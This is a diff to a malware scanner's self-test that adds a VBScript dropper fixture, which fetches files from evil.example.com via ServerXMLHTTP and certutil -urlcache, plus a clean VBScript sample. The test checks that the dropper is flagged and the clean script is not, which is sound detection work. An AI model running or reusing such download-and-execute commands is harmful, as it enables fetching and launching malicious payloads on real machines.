@@ -196,6 +196,31 @@ def run_selftest(signatures_file: Optional[str] = None) -> int:
               not any(f.kind == "behavior" for f in findings),
               str(sorted({f.name for f in findings})))
 
+        evil_vbs = workdir / "evil.vbs"
+        evil_vbs.write_text(
+            "Set shell = CreateObject(\"WScript.Shell\")\n"
+            "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
+            "http.Open \"GET\", \"http://evil.example.com/s.bin\", False\n"
+            "http.Send\n"
+            "shell.Run \"certutil -urlcache -f http://evil.example.com/x.exe\", 0\n"
+        )
+        findings = scanner.scan_file(evil_vbs)
+        vbs_high = [f for f in findings if f.kind == "behavior"
+                    and f.severity == "high"]
+        check("behaviour: VBScript dropper detected (VBS layer)",
+              len(vbs_high) >= 2,
+              str(sorted({f.name for f in findings})))
+
+        clean_vbs = workdir / "clean.vbs"
+        clean_vbs.write_text(
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+            "WScript.Echo \"done\" & Now()\n"
+        )
+        findings = scanner.scan_file(clean_vbs)
+        check("behaviour: clean VBScript not flagged",
+              not any(f.kind == "behavior" for f in findings),
+              str(sorted({f.name for f in findings})))
+
         from .samples import SUSPICIOUS_PE_DLLS, build_sample_pe
 
         pe = workdir / "suspicious.exe"
